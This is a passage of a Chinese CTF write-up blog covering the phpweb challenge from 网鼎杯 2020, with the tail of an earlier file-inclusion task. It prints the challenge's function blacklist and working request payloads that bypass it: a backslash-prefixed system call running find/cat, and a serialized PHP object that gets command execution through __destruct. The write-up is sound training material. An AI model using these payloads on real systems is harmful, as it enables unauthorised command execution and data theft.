class="hljs-attribute">GB18030</span><br>    <span class="hljs-attribute">HZ</span><br>    <span class="hljs-attribute">EUC</span>-TW*<br>    <span class="hljs-attribute">CP950</span><br>    <span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">EUC</span>-KR*<br>    <span class="hljs-attribute">UHC</span>（别名：CP949）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>（别名：CP1251）<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>（别名：CP1252）<br>    <span class="hljs-attribute">CP866</span>（别名：IBM866）<br>    <span class="hljs-attribute">KOI8</span>-R*<br>    <span class="hljs-attribute">KOI8</span>-U*<br>    <span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span>（别名：ArmSCII8<br></code></pre></td></tr></table></figure><br>直接去翻了wp。。感谢这位师傅：<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png" srcset="/img/loading.gif" lazyload alt="image"><br>根据长度排列一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png" srcset="/img/loading.gif" lazyload alt="image"><br>拿到flag：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png" srcset="/img/loading.gif" lazyload alt="image"><br>最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png" srcset="/img/loading.gif" lazyload alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png" srcset="/img/loading.gif" lazyload alt="image"><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br><br>1xx（信息性状态码）：表示请求已被接收，继续处理。<br>   <span class="hljs-number"> 100 </span>Continue：服务器已接收到请求的初始部分，客户端应继续发送剩余部分。<br>   <span class="hljs-number"> 101 </span>Switching Protocols：服务器已理解并接受客户端的请求，将切换到新的协议。<br><br>2xx（成功状态码）：表示请求已成功被服务器接收、理解和处理。<br>   <span class="hljs-number"> 200 </span>OK：请求成功，服务器返回请求的内容。<br>   <span class="hljs-number"> 201 </span>Created：请求成功，服务器创建了新资源。<br>   <span class="hljs-number"> 204 </span>No Content：请求成功，服务器处理成功，但没有返回任何内容。<br><br>3xx（重定向状态码）：表示需要进一步操作以完成请求。<br>   <span class="hljs-number"> 301 </span>Moved Permanently：请求的资源已永久移动到新位置。<br>   <span class="hljs-number"> 302 </span>Found：请求的资源临时移动到新位置。<br>   <span class="hljs-number"> 304 </span>Not Modified：资源未修改，客户端可以使用缓存的版本。<br><br>4xx（客户端错误状态码）：表示客户端发送的请求有错误。<br>   <span class="hljs-number"> 400 </span>Bad Request：请求无效，服务器无法理解。<br>   <span class="hljs-number"> 401 </span>Unauthorized：请求要求身份验证。<br>   <span class="hljs-number"> 404 </span>Not Found：请求的资源不存在。<br><br>5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。<br>   <span class="hljs-number"> 500 </span>Internal Server Error：服务器遇到了意外错误。<br>   <span class="hljs-number"> 502 </span>Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效响应。<br>   <span class="hljs-number"> 503 </span>Service Unavailable：服务器当前无法处理请求，通常由于过载或维护。<br></code></pre></td></tr></table></figure><br><strong>[网鼎杯 2020 朱雀组]phpweb</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png" srcset="/img/loading.gif" lazyload alt="image"><br>没啥特别的。。不过这页面没过几秒就会刷新一下，出现下面这种东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png" srcset="/img/loading.gif" lazyload alt="image"><br>他说某个和data有关的函数设置有问题?右键看下源码有啥东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png" srcset="/img/loading.gif" lazyload alt="image"><br>burpsuite抓下包看看：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png" srcset="/img/loading.gif" lazyload alt="image"><br>下面有个这个东西：<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>前面是个函数？后面是他的参数？看着像命令执行，改成system(‘ls’)看看效果：<br><code>func=system&amp;p=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png" srcset="/img/loading.gif" lazyload alt="image"><br>回显了hacker。。估计是太直白了，system&#x2F;eval都会回显Hacker。include&#x2F;require函数读下index.php的源码？<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png" srcset="/img/loading.gif" lazyload alt="image"><br>提示call_user_func()函数找不到第一个参数include&#x2F;require或这是一个无效的函数名？怎么会找不到include()函数呢？问了下GPT发现call_back_func不是所有函数都能执行，它是<strong>调用一个回调函数或方法</strong>。而且并不是所有函数都是回调函数，判断一个函数能否回调可以用<code>is_callable</code>函数，比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果：不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>不得不说CHATGPT这东西确实好用，我问他call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)为什么不行时他不光给了不可用的理由，还建议我用file_get_contents()函数去读文件：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png" srcset="/img/loading.gif" lazyload alt="image"><br>差点把这东西忘了，既然它可以回调就file_get_contents(index.php)读下Index.php：<br><code>func=file_get_contents&amp;p=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<span class="hljs-comment">//黑名单，禁用了很多函数</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>       <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>); <span class="hljs-comment">//调用call_user_func函数，注意该函数只能调用可以回调的函数</span><br>       <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>); <span class="hljs-comment">//$result是什么类型？</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123; <span class="hljs-comment">//如果是字符串</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125; <span class="hljs-comment">//如果是其它</span><br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="hljs-comment">//旧式的用于声明类属性（成员变量）的关键字，新版本的PHP多用 public等</span><br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<span class="hljs-comment">//获取通过 GET、POST 和 COOKIE 方法传递的参数</span><br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>       <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>尝试用相对路径读有没有flag.php这东西。。没试出来。。就去网上找了下wp。感觉已经很接近结果了有点不甘心😔感谢这位师傅的文章：<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>第一种方法：<br>在PHP中的函数前面加个\并不印象函数运行(php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单)。拿前面那个is_callable函数举个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (\<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果仍是不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>问了下GPT，这个\是一种命名空间限定符，用于告诉 PHP 解释器要使用全局命名空间中的函数，而不是当前命名空间中的函数。如果没有使用命名空间或没有同名函数存在于全局命名空间中，添加反斜杠将没有实际影响。<br><code>func=\system&amp;p=find / -name &quot;flag*&quot;//跟以前做的题一样，只要用find找东西就是全磁盘查找，会很慢</code><br>回显：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png" srcset="/img/loading.gif" lazyload alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png" srcset="/img/loading.gif" lazyload alt="image"><br>读最底下这个<code>/tmp/flagoefiu4r93</code>：<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>或者<code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code><br>得flag<br>第二种方法用了反序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p); <span class="hljs-comment">//命令执行</span><br>            &#125;<br>        &#125;<br><span class="hljs-comment">//这东西没被用过，因为Test类里包含一个__destruct函数，这函数在对象被销毁时会被调用，</span><br></code></pre></td></tr></table></figure>
+<p>我们想执行system(‘ls’)而且要绕过对func的黑名单检测，可以先序列化要执行的命令，然后利用get函数反序列化要执行的命令，反序列化后要销毁变量时会调用__destruct函数，这个函数定义了func(要执行的命令)和p(要执行命令的参数)，然后再调用一次gettime函数(又执行了一次命令)。一来一回执行了两次gettime。<br>先序列化我们要执行的命令和参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>       <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>	<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//结果：O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+<p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// 看当前目录下有什么文件</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png" srcset="/img/loading.gif" lazyload alt="image"><br>OK，没啥问题，因为根据第一种做法已经知道了flag藏在哪，直接去找<code>/tmp/flagoefiu4r93</code>把我们的命令序列化一下：<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>结果：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Writeup_2022 NewstarCTF_Week1(Web部分)</div>
+      <div>http://example.com/2023/09/11/攻防世界做题记录3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>notbad3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/" title="PHP中的弱相等和强相等">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP中的弱相等和强相等</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
